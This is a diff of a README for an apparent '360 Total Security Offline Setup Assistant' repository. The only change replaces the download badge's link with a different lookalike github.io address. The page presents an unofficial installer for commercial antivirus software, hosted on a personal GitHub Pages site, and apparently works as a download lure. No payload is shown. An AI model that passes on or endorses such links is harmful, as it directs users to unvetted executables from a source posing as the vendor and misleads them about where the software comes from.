@@ -1,6 +1,6 @@
 # 360 Total Security — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://360-total-security-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://360-total-securitypro-download.github.io/.github/)
 
 360 Total Security provides a comprehensive suite of tools for antivirus protection, system cleanup, and real-time security. This setup assistant enables complete offline installation with no internet login required.
 
